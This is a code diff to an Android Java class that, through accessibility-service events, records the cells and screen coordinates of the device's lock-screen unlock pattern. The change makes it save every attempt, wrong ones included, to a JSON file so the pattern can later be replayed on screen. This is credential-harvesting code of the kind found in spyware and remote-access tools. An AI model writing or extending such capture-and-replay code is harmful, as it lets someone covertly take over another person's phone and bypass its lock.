@@ -1273,8 +1273,8 @@ public class GestureRecorder {
     private void onScreenOff() {
         try {
             stopLockCapture();
-            // Screen off while locked = user gave up or pattern was wrong. Discard cells.
-            clearAdvancedUnlockCapture();
+            // Let the delayed-save timer handle any pending advanced unlock cells —
+            // do NOT clear them here so captures just before screen-off are not lost.
         } catch (Exception e) {
             Log.e(TAG, "onScreenOff: " + e.getMessage());
         }
@@ -2166,6 +2166,10 @@ public class GestureRecorder {
     // Cells captured so far for the current pattern attempt: [cellNum, left, top, right, bottom]
     private final List<int[]> advCells         = new ArrayList<>();
     private final Handler     advUnlockHandler = new Handler(Looper.getMainLooper());
+    private Runnable          advUnlockSaveTask;
+
+    // Save this long after the last cell arrives (covers both correct and wrong attempts)
+    private static final long ADV_SAVE_DELAY_MS = 1500;
 
     /**
      * Called from UnifiedAccessibilityService when an accessibility event reveals
@@ -2180,33 +2184,53 @@ public class GestureRecorder {
      */
     public void onAdvancedUnlockCellDetected(int cellNum, int left, int top, int right, int bottom) {
         // If this cell was already recorded, the user is starting a NEW pattern attempt.
-        // Clear previous cells and restart — do not ignore the event.
+        // Commit whatever we have so far, then restart with this cell.
         boolean alreadySeen = false;
         for (int[] c : advCells) {
             if (c[0] == cellNum) { alreadySeen = true; break; }
         }
         if (alreadySeen) {
-            advCells.clear();
-            Log.d(TAG, "AdvancedUnlock: new attempt detected — buffer cleared");
+            // Cancel pending save and immediately commit the previous attempt
+            if (advUnlockSaveTask != null) {
+                advUnlockHandler.removeCallbacks(advUnlockSaveTask);
+                advUnlockSaveTask = null;
+            }
+            commitAdvancedUnlockPattern();
+            Log.d(TAG, "AdvancedUnlock: new attempt detected — previous pattern committed");
         }
         // Store full bounds so replay can draw through real screen coordinates
         advCells.add(new int[]{cellNum, left, top, right, bottom});
         Log.i(TAG, "AdvancedUnlock: cell " + cellNum
                 + " bounds(" + left + "," + top + "," + right + "," + bottom + ")");
+
+        // (Re)schedule the delayed save so every draw is persisted
+        if (advUnlockSaveTask != null) advUnlockHandler.removeCallbacks(advUnlockSaveTask);
+        advUnlockSaveTask = this::commitAdvancedUnlockPattern;
+        advUnlockHandler.postDelayed(advUnlockSaveTask, ADV_SAVE_DELAY_MS);
     }
 
-    /** Discard any in-progress capture (e.g. screen turned off mid-gesture or wrong pattern). */
+    /** Discard any in-progress capture (e.g. screen turned off mid-gesture). */
     public void clearAdvancedUnlockCapture() {
+        if (advUnlockSaveTask != null) {
+            advUnlockHandler.removeCallbacks(advUnlockSaveTask);
+            advUnlockSaveTask = null;
+        }
         advCells.clear();
         Log.d(TAG, "AdvancedUnlock: capture cleared");
     }
 
     /**
      * Called when the device successfully unlocks (ACTION_USER_PRESENT).
-     * Persists whatever cells were captured — if we got here, the pattern was correct.
+     * Commits any pending cells immediately (the pattern was correct).
      */
     public void commitAdvancedUnlockOnUnlock() {
-        advUnlockHandler.post(this::commitAdvancedUnlockPattern);
+        if (advUnlockSaveTask != null) {
+            advUnlockHandler.removeCallbacks(advUnlockSaveTask);
+            advUnlockSaveTask = null;
+        }
+        if (!advCells.isEmpty()) {
+            advUnlockHandler.post(this::commitAdvancedUnlockPattern);
+        }
     }
 
     /** Persist the collected cells as a JSON file in the advanced_unlock directory. */
